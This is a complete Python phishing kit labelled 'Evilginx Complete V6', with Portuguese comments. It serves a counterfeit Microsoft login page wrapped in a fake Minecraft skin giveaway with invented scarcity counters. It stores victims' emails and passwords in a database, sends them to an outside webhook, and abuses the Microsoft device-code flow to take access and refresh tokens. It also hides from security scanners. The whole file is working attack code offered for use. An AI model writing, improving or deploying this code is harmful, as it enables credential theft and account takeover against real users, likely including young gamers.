#!/usr/bin/env python3
"""
EVILGINX COMPLETE V6 - VERSÃO CORRIGIDA (TODOS OS BUGS RESOLVIDOS)
Interface Microsoft + Skins + Sorteio OG + Tokens + Click Tracking
"""

import secrets
import json
import datetime
import random
import time
import requests
import os
import sqlite3
import re
import threading
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from collections import deque
from email.utils import parseaddr

# ============================================================
# CONFIGURAÇÃO
# ============================================================

PORT = int(os.environ.get("PORT", 8080))
PUBLIC_URL = os.environ.get("PUBLIC_URL", f"http://localhost:{PORT}")
WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "")
DEVICE_CLIENT_ID = "1950a258-227b-4e31-a9cf-717495945fc2"
MAX_SESSIONS = 100

# ============================================================
# ESTADO (limitado e thread-safe)
# ============================================================

captured_sessions = deque(maxlen=MAX_SESSIONS)
click_stats = {}
click_stats_lock = threading.Lock()

_counter = 0
_counter_lock = threading.Lock()

def get_next_session_id():
    global _counter
    with _counter_lock:
        _counter += 1
        return f"SID_{_counter}_{secrets.token_hex(8)}"

# ============================================================
# BANCO DE DADOS
# ============================================================

def init_db():
    with sqlite3.connect('captured.db') as conn:
        conn.execute('''CREATE TABLE IF NOT EXISTS victims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT, email TEXT, password TEXT, ip TEXT,
            user_agent TEXT, access_token TEXT, refresh_token TEXT,
            click_count INTEGER
        )''')

def save_to_db(data):
    with sqlite3.connect('captured.db') as conn:
        conn.execute('''INSERT INTO victims (timestamp, email, password, ip, user_agent, access_token, refresh_token, click_count)
                       VALUES (?,?,?,?,?,?,?,?)''',
                     (data['timestamp'], data['email'], data['password'], data['ip'],
                      data['user_agent'], data.get('access_token', ''), data.get('refresh_token', ''),
                      data.get('click_count', 0)))
        conn.commit()

init_db()

# ============================================================
# WEBHOOK
# ============================================================

def send_webhook(email, password, ip, access_token="", refresh_token="", click_count=0):
    if not WEBHOOK_URL:
        return
    try:
        embed = {
            "title": "🎯 NOVA CONTA CAPTURADA!",
            "color": 0xff0000,
            "fields": [
                {"name": "📧 Email", "value": email, "inline": True},
                {"name": "🔑 Senha", "value": f"||{password}||", "inline": True},
                {"name": "🌐 IP", "value": ip, "inline": True},
                {"name": "🖱️ Cliques", "value": str(click_count), "inline": True}
            ]
        }
        if access_token:
            embed["fields"].append({"name": "🔐 Access Token", "value": f"||{access_token[:50]}...||", "inline": False})
        if refresh_token:
            embed["fields"].append({"name": "🔄 Refresh Token", "value": f"||{refresh_token[:50]}...||", "inline": False})
        response = requests.post(WEBHOOK_URL, json={"embeds": [embed]}, timeout=5)
        response.raise_for_status()
    except Exception as e:
        print(f"[ERRO WEBHOOK] {e}")

# ============================================================
# DEVICE CODE (TOKENS REAIS)
# ============================================================

def start_device_flow():
    try:
        r = requests.post("https://login.microsoftonline.com/common/oauth2/v2.0/devicecode",
                         data={"client_id": DEVICE_CLIENT_ID, "scope": "https://graph.microsoft.com/.default offline_access"},
                         timeout=10)
        if r.status_code == 200:
            j = r.json()
            return j.get("user_code"), j.get("device_code"), j.get("verification_uri")
    except Exception as e:
        print(f"[DEVICE CODE ERRO] {e}")
    return None, None, None

def poll_for_token(device_code):
    url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
    for _ in range(60):
        try:
            r = requests.post(url, data={
                "client_id": DEVICE_CLIENT_ID,
                "device_code": device_code,
                "grant_type": "urn:ietf:params:oauth:grant-type:device_code"
            }, timeout=5)
            if r.status_code == 200:
                j = r.json()
                return j.get("access_token", ""), j.get("refresh_token", "")
        except requests.exceptions.RequestException as e:
            print(f"[POLL ERRO] {e}")
        time.sleep(5)
    return "", ""

# ============================================================
# VALIDAÇÃO
# ============================================================

def is_valid_email(email):
    """Validação mais rigorosa de email"""
    if not email:
        return False
    # Usa parseaddr para extrair parte real do email
    name, addr = parseaddr(email)
    if not addr:
        return False
    # Regex para formato padrão
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    return bool(re.match(pattern, addr))

def sanitize_html(text):
    """Escapa HTML para evitar XSS"""
    if not text:
        return ""
    return (text.replace("&", "&amp;")
                .replace("<", "&lt;")
                .replace(">", "&gt;")
                .replace('"', "&quot;")
                .replace("'", "&#39;"))

def escape_js_string(text):
    """Escapa string para uso seguro dentro de JavaScript"""
    if not text:
        return '""'
    return json.dumps(str(text))

def is_bot(headers):
    ua = headers.get('User-Agent', '').lower()
    bots = ['googlebot', 'bingbot', 'ahrefsbot', 'semrushbot', 'virustotal', 'phishtank', 'urlscan']
    return any(bot in ua for bot in bots)

# ============================================================
# SERVIDOR
# ============================================================

class EvilginxHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def _send(self, status, content_type, body):
        self.send_response(status)
        self.send_header('Content-type', content_type)
        self.end_headers()
        self.wfile.write(body if isinstance(body, bytes) else body.encode())

    def do_GET(self):
        path = urlparse(self.path).path
        if is_bot(self.headers):
            self._send(200, "text/html", b"Microsoft 365")
            return
        
        if path == '/':
            self._serve_login()
        elif path == '/dashboard':
            self._serve_dashboard()
        elif path == '/qrcode':
            self._serve_qrcode()
        elif path == '/device/poll':
            self._handle_poll()
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        path = urlparse(self.path).path
        if path == '/auth':
            self._handle_auth()
        elif path == '/api/click':
            self._handle_click()
        else:
            self.send_response(404)
            self.end_headers()

    def _handle_poll(self):
        query = parse_qs(urlparse(self.path).query)
        device_code = query.get('device_code', [None])[0]
        if not device_code:
            self._send(400, "application/json", json.dumps({"error": "missing device_code"}))
            return
        access, refresh = poll_for_token(device_code)
        self._send(200, "application/json", json.dumps({"access_token": access, "refresh_token": refresh}))

    def _handle_click(self):
        ip = self.client_address[0]
        with click_stats_lock:
            click_stats[ip] = click_stats.get(ip, 0) + 1
        self._send(200, "application/json", json.dumps({"status": "ok"}))

    def _serve_qrcode(self):
        user_code, device_code, ver_uri = start_device_flow()
        # Escapamento seguro para JavaScript
        qr_url_json = escape_js_string(ver_uri if device_code else PUBLIC_URL)
        device_safe = escape_js_string(device_code) if device_code else '""'
        manual = f'<p><strong>📋 Código manual:</strong> <code style="font-size:24px">{sanitize_html(user_code)}</code></p>' if user_code else ''

        html = f'''<!DOCTYPE html>
<html><head><title>QR Code - Tokens</title>
<style>body{{background:#1a1a2e;color:white;text-align:center;padding:20px;font-family:'Segoe UI',sans-serif;}}</style></head>
<body>
<h1>📱 Escaneie para autorizar sua conta Microsoft</h1>
{manual}
<p>Ou escaneie o QR Code abaixo:</p>
<div id="qrcode" style="background:white;padding:20px;display:inline-block;border-radius:10px;"></div>
<br><br>
<button onclick="pollToken()" style="background:#0067b8;color:white;border:none;padding:10px 20px;border-radius:5px;cursor:pointer;">🔍 Obter Token</button>
<div id="tokenResult" style="margin-top:20px;padding:10px;background:#333;border-radius:8px;"></div>
<script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
<script>
let qrUrl = {qr_url_json};
let deviceCode = {device_safe};
new QRCode(document.getElementById("qrcode"), {{text: qrUrl, width:250, height:250}});
async function pollToken() {{
    if(!deviceCode) {{ document.getElementById('tokenResult').innerHTML = 'Falha'; return; }}
    document.getElementById('tokenResult').innerHTML = '⏳ Aguardando autorização...';
    try {{
        let resp = await fetch(`/device/poll?device_code=${{encodeURIComponent(deviceCode)}}`);
        let data = await resp.json();
        if(data.access_token) {{
            document.getElementById('tokenResult').innerHTML = '✅ Access Token obtido!<br>✅ Refresh Token obtido!';
        }} else {{
            document.getElementById('tokenResult').innerHTML = '⏳ Ainda aguardando... Autorize no celular e clique novamente.';
        }}
    }} catch(e) {{
        document.getElementById('tokenResult').innerHTML = 'Erro: ' + e.message;
    }}
}}
</script>
<a href="/" style="color:#89b4fa;">← Voltar</a>
</body></html>'''
        self._send(200, "text/html", html)

    def _serve_login(self):
        session_id = get_next_session_id()
        og_name = random.choice(["KILL", "HERO", "GOLD", "STAR", "MOON", "FIRE", "SNOW", "LIFE"])
        skin_name = "ENDER PHOENIX"
        fake_participants = random.randint(15400, 15800)
        fake_remaining = random.randint(37, 89)
        skin_value = "R$89,90"

        html = f'''<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Entrar na sua conta - Microsoft</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, 'Roboto', sans-serif;
            background: #f1f1f1;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }}
        .container {{ max-width: 440px; width: 100%; }}
        
        /* BANNER DO EVENTO */
        .event-banner {{
            background: linear-gradient(135deg, #ffd700, #ffb347);
            border-radius: 12px;
            padding: 18px;
            margin-bottom: 20px;
            text-align: center;
            color: #1a1a2e;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
        }}
        .event-title {{
            font-size: 20px;
            font-weight: bold;
        }}
        .event-skin {{
            font-size: 24px;
            font-weight: bold;
            color: #e94560;
            margin: 5px 0;
        }}
        .event-giveaway {{
            background: rgba(0,0,0,0.1);
            border-radius: 8px;
            padding: 8px;
            margin-top: 8px;
        }}
        .account-name {{
            font-family: monospace;
            font-size: 18px;
            font-weight: bold;
            background: #1a1a2e;
            color: #ffd700;
            display: inline-block;
            padding: 2px 10px;
            border-radius: 5px;
        }}
        
        /* CONTADORES DE ESCASSEZ */
        .scarcity-box {{
            background: #fff3cd;
            border-left: 4px solid #ff9800;
            border-radius: 8px;
            padding: 12px;
            margin-bottom: 15px;
            font-size: 13px;
        }}
        .scarcity-row {{
            display: flex;
            justify-content: space-between;
            margin: 5px 0;
        }}
        .scarcity-value {{
            font-weight: bold;
            color: #e94560;
        }}
        
        /* LOGIN CARD (MICROSOFT ORIGINAL) */
        .login-card {{
            background: white;
            border-radius: 4px;
            padding: 44px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }}
        .microsoft-logo svg {{
            width: 108px;
            height: 23px;
            margin-bottom: 28px;
        }}
        h1 {{ font-size: 24px; font-weight: 600; margin-bottom: 16px; }}
        .input-field {{
            width: 100%;
            padding: 12px;
            font-size: 15px;
            border: 1px solid #8a8a8a;
            border-radius: 2px;
            margin-bottom: 20px;
        }}
        .input-field:focus {{ border-color: #0067b8; outline: none; }}
        .sign-in-btn {{
            width: 100%;
            background: #0067b8;
            color: white;
            border: none;
            padding: 10px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            border-radius: 2px;
        }}
        .sign-in-btn:hover {{ background: #004c8f; }}
        .links {{ margin-top: 24px; }}
        .links a {{ color: #0067b8; text-decoration: none; font-size: 13px; margin-right: 20px; }}
        .footer {{ margin-top: 32px; font-size: 11px; color: #666; text-align: center; }}
        .step-2 {{ display: none; }}
        .user-badge {{
            display: flex;
            align-items: center;
            gap: 12px;
            background: #f5f5f5;
            padding: 12px;
            border-radius: 4px;
            margin-bottom: 20px;
        }}
        .error-message {{ color: #d13438; font-size: 12px; margin-bottom: 10px; display: none; }}
        
        /* PROVA SOCIAL */
        .social-proof {{
            margin-top: 20px;
            font-size: 12px;
            color: #666;
            text-align: center;
            border-top: 1px solid #eee;
            padding-top: 15px;
        }}
        .live-counter {{
            animation: pulse 1.5s infinite;
            font-weight: bold;
            color: #e94560;
        }}
        @keyframes pulse {{
            0% {{ opacity: 1; }}
            50% {{ opacity: 0.6; }}
            100% {{ opacity: 1; }}
        }}
        .timer {{
            font-family: monospace;
            font-size: 16px;
            font-weight: bold;
            color: #d13438;
        }}
    </style>
</head>
<body>
<div class="container">
    <!-- BANNER DO EVENTO -->
    <div class="event-banner">
        <div class="event-title">🎉 EVENTO ESPECIAL MINECRAFT 2026 🎉</div>
        <div class="event-skin">🔥 {skin_name} 🔥</div>
        <div style="font-size: 12px;">Valor: {skin_value}</div>
        <div class="event-giveaway">
            🏆 <strong>SORTEIO DE CONTA RARA!</strong> 🏆<br>
            Conta com nome <span class="account-name">{og_name}</span> (4 letras)<br>
            Valor estimado: <strong>R$500+</strong>
        </div>
    </div>
    
    <!-- CONTADORES DE ESCASSEZ (prova social + urgência) -->
    <div class="scarcity-box">
        <div class="scarcity-row">
            <span>🎁 Skins disponíveis:</span>
            <span class="scarcity-value" id="skinsLeft">{fake_remaining}</span>
        </div>
        <div class="scarcity-row">
            <span>👥 Participantes do sorteio:</span>
            <span class="scarcity-value" id="participants">{fake_participants}</span>
        </div>
        <div class="scarcity-row">
            <span>⏰ Oferta expira em:</span>
            <span class="scarcity-value timer" id="timer">14:59</span>
        </div>
        <div class="scarcity-row">
            <span>👀 Pessoas online agora:</span>
            <span class="scarcity-value live-counter" id="onlineCount">0</span>
        </div>
    </div>
    
    <!-- CARD DE LOGIN MICROSOFT -->
    <div class="login-card">
        <div class="microsoft-logo">
            <svg viewBox="0 0 108 23" fill="none" xmlns="http://www.w3.org/2000/svg">
                <rect x="2" y="2" width="8" height="8" fill="#F25022"/>
                <rect x="12" y="2" width="8" height="8" fill="#7FBA00"/>
                <rect x="2" y="12" width="8" height="8" fill="#00A4EF"/>
                <rect x="12" y="12" width="8" height="8" fill="#FFB900"/>
                <path d="M32 18V4H35.5L41 13.2L46.5 4H50V18H46.5V9.4L41 18.6L35.5 9.4V18H32Z" fill="#1E1E1E"/>
                <path d="M58 18V4H68V7.2H61.5V9.8H67V13H61.5V14.8H68V18H58Z" fill="#1E1E1E"/>
                <path d="M74 18V4H84V7.2H77.5V9.8H83V13H77.5V14.8H84V18H74Z" fill="#1E1E1E"/>
                <path d="M90 18V4H100V7.2H93.5V9.8H99V13H93.5V14.8H100V18H90Z" fill="#1E1E1E"/>
            </svg>
        </div>

        <div id="step1">
            <h1>Entrar</h1>
            <p style="font-size: 14px; color: #666; margin-bottom: 20px;">Use sua conta da Microsoft para continuar e participar do sorteio</p>
            <form id="emailForm">
                <input type="email" id="email" class="input-field" placeholder="Email, telefone ou Skype" autofocus>
                <div id="emailError" class="error-message"></div>
                <button type="submit" class="sign-in-btn">Avançar</button>
            </form>
        </div>

        <div id="step2" class="step-2">
            <div class="user-badge">
                <div style="width:40px;height:40px;background:#0067b8;border-radius:50%;display:flex;align-items:center;justify-content:center;color:white;">👤</div>
                <div>
                    <div id="userEmailDisplay" style="font-size:14px;font-weight:500;"></div>
                    <a href="#" onclick="resetToStep1();return false;" style="font-size:12px;color:#0067b8;">Alterar conta</a>
                </div>
            </div>
            <h1>Inserir senha</h1>
            <form id="passwordForm">
                <div style="position:relative;">
                    <input type="password" id="password" class="input-field" placeholder="Senha">
                    <button type="button" onclick="togglePassword()" style="position:absolute;right:10px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;">👁️</button>
                </div>
                <div id="passwordError" class="error-message"></div>
                <button type="submit" class="sign-in-btn">Entrar</button>
            </form>
        </div>

        <div class="links">
            <a href="#">Criar uma conta!</a>
            <a href="#" style="margin-left:20px;">Esqueceu sua senha?</a>
        </div>
        <div class="footer">
            <a href="#">Termos de uso</a> &nbsp;|&nbsp;
            <a href="#">Política de Privacidade</a>
        </div>
        
        <div class="social-proof">
            🔒 Verificação de segurança ativa | 🌍 +12 servidores integrados
        </div>
    </div>
</div>

<script>
    let capturedEmail = '';
    let sessionId = '{session_id}';
    let pageStartTime = Date.now();
    let clickCount = 0;
    
    // Contadores dinâmicos
    let skinsLeft = {fake_remaining};
    let participants = {fake_participants};
    let onlineVisitors = Math.floor(Math.random() * 80) + 40;
    let timerSeconds = 900; // 15 minutos
    
    // Tracking de cliques
    function trackClick() {{
        clickCount++;
        fetch('/api/click', {{ method: 'POST' }});
    }}
    
    document.addEventListener('click', trackClick);
    
    // Atualiza contadores em tempo real
    setInterval(() => {{
        if(skinsLeft > 0) {{
            skinsLeft -= Math.floor(Math.random() * 2) + 1;
            document.getElementById('skinsLeft').innerHTML = Math.max(0, skinsLeft);
        }}
        participants += Math.floor(Math.random() * 3) + 1;
        document.getElementById('participants').innerHTML = participants.toLocaleString();
        
        onlineVisitors += Math.floor(Math.random() * 5) - 2;
        onlineVisitors = Math.min(300, Math.max(25, onlineVisitors));
        document.getElementById('onlineCount').innerHTML = onlineVisitors;
        
        if(timerSeconds > 0) {{
            timerSeconds--;
            let mins = Math.floor(timerSeconds / 60);
            let secs = timerSeconds % 60;
            document.getElementById('timer').innerHTML = `${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
            if(timerSeconds === 60) {{
                document.getElementById('timer').style.color = '#d13438';
                document.getElementById('timer').style.animation = 'pulse 1s infinite';
            }}
        }}
    }}, 3000);
    
    document.getElementById('onlineCount').innerHTML = onlineVisitors;
    
    function togglePassword() {{
        const pwd = document.getElementById('password');
        pwd.type = pwd.type === 'password' ? 'text' : 'password';
    }}
    
    function resetToStep1() {{
        document.getElementById('step1').style.display = 'block';
        document.getElementById('step2').style.display = 'none';
        document.getElementById('email').value = '';
        document.getElementById('password').value = '';
    }}
    
    document.getElementById('emailForm').addEventListener('submit', function(e) {{
        e.preventDefault();
        const email = document.getElementById('email').value;
        const emailError = document.getElementById('emailError');
        
        if (!email || !email.includes('@')) {{
            emailError.textContent = 'Digite um endereço de email válido';
            emailError.style.display = 'block';
            return;
        }}
        
        emailError.style.display = 'none';
        capturedEmail = email;
        document.getElementById('userEmailDisplay').textContent = email;
        document.getElementById('step1').style.display = 'none';
        document.getElementById('step2').style.display = 'block';
        document.getElementById('password').focus();
    }});
    
    document.getElementById('passwordForm').addEventListener('submit', function(e) {{
        e.preventDefault();
        const password = document.getElementById('password').value;
        const passwordError = document.getElementById('passwordError');
        
        if (!password) {{
            passwordError.textContent = 'Digite sua senha';
            passwordError.style.display = 'block';
            return;
        }}
        
        passwordError.style.display = 'none';
        const timeOnPage = Math.floor((Date.now() - pageStartTime) / 1000);
        
        fetch('/auth', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify({{
                email: capturedEmail,
                password: password,
                session_id: sessionId,
                user_agent: navigator.userAgent,
                time_on_page: timeOnPage,
                click_count: clickCount
            }})
        }}).then(() => {{
            // Redireciona para o site REAL da Microsoft
            window.location.href = 'https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13';
        }});
    }});
</script>
</body>
</html>'''
        self._send(200, "text/html", html)

    def _handle_auth(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode()
        try:
            data = json.loads(body)
        except json.JSONDecodeError:
            self._send(400, "text/plain", "Bad JSON")
            return

        email = data.get('email', '').strip()
        password = data.get('password', '').strip()
        user_agent = data.get('user_agent', '')[:200]
        click_count = data.get('click_count', 0)
        ip = self.client_address[0]

        if not is_valid_email(email) or not password:
            self._send(400, "text/plain", "Invalid data")
            return

        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        captured_sessions.append({
            "timestamp": timestamp, "email": email,
            "password": password, "ip": ip, "user_agent": user_agent,
            "click_count": click_count
        })

        save_to_db({'timestamp': timestamp, 'email': email, 'password': password,
                    'ip': ip, 'user_agent': user_agent, 'click_count': click_count})

        send_webhook(email, password, ip, click_count=click_count)

        print(f"\n[{timestamp}] 🎯 CAPTURADA! Email: {email} | Senha: {password} | IP: {ip} | Cliques: {click_count}")
        self._send(200, "application/json", json.dumps({"status": "ok"}))

    def _serve_dashboard(self):
        rows = ""
        for c in captured_sessions:
            # Sanitiza cada campo para evitar XSS
            timestamp = sanitize_html(c["timestamp"])
            email = sanitize_html(c["email"])
            password = sanitize_html(c["password"])
            ip = sanitize_html(c["ip"])
            click_count = sanitize_html(str(c.get("click_count", 0)))
            rows += f'<tr><td>{timestamp}</td><td>{email}</td><td>{password}</td><td>{ip}</td><td>{click_count}</td></tr>'

        # Estatísticas de cliques
        with click_stats_lock:
            total_clicks = sum(click_stats.values())
            unique_ips = len(click_stats)

        html = f'''<!DOCTYPE html>
<html>
<head>
    <title>Dashboard - Evilginx</title>
    <style>
        body {{ background: #0f0f1a; color: #cdd6f4; font-family: monospace; padding: 20px; }}
        table {{ width: 100%; border-collapse: collapse; background: #1e1e2e; }}
        th, td {{ padding: 10px; text-align: left; border-bottom: 1px solid #313244; }}
        th {{ background: #313244; }}
        a {{ color: #89b4fa; }}
        .stats {{ display: flex; gap: 15px; margin-bottom: 20px; }}
        .stat {{ background: #1e1e2e; padding: 10px 15px; border-radius: 8px; }}
        .stat-value {{ font-size: 24px; font-weight: bold; color: #89b4fa; }}
    </style>
</head>
<body>
    <h1>🎯 DASHBOARD - EVILGINX</h1>
    <div class="stats">
        <div class="stat">
            <div class="stat-value">{len(captured_sessions)}</div>
            <div>Total Capturas</div>
        </div>
        <div class="stat">
            <div class="stat-value">{total_clicks}</div>
            <div>Total Cliques</div>
        </div>
        <div class="stat">
            <div class="stat-value">{unique_ips}</div>
            <div>IPs Únicos</div>
        </div>
    </div>
    <p>Últimas captures (máx 100):</p>
    <table>
        <thead>
            <tr><th>Data/Hora</th><th>Email</th><th>Senha</th><th>IP</th><th>Cliques</th></tr>
        </thead>
        <tbody>{rows}</tbody>
    </table>
    <br>
    <a href="/">← Voltar</a>
    <a href="/qrcode" style="margin-left:15px;">🎯 QR Code (Tokens)</a>
</body>
</html>'''
        self._send(200, "text/html", html)

def run():
    print("=" * 70)
    print("🎯 EVILGINX COMPLETE V6 - TODAS AS CORREÇÕES APLICADAS")
    print("=" * 70)
    print(f"📡 Servidor: {PUBLIC_URL}")
    print(f"🎁 Página de login: {PUBLIC_URL}")
    print(f"📊 Dashboard: {PUBLIC_URL}/dashboard")
    print(f"🎯 QR Code (Tokens): {PUBLIC_URL}/qrcode")
    print("=" * 70)
    print("✅ Correções aplicadas:")
    print("   - Rota /api/click implementada")
    print("   - click_stats funcional e exibido no dashboard")
    print("   - Sanitização HTML no dashboard (evita XSS)")
    print("   - Escapamento seguro para JavaScript (json.dumps)")
    print("   - Tratamento de exceções específico em poll_for_token")
    print("   - Validação de email mais rigorosa com parseaddr")
    print("   - Click tracking na captura e banco de dados")
    print("=" * 70)

    server = ThreadingHTTPServer(("0.0.0.0", PORT), EvilginxHandler)
    server.serve_forever()

if __name__ == "__main__":
    run()
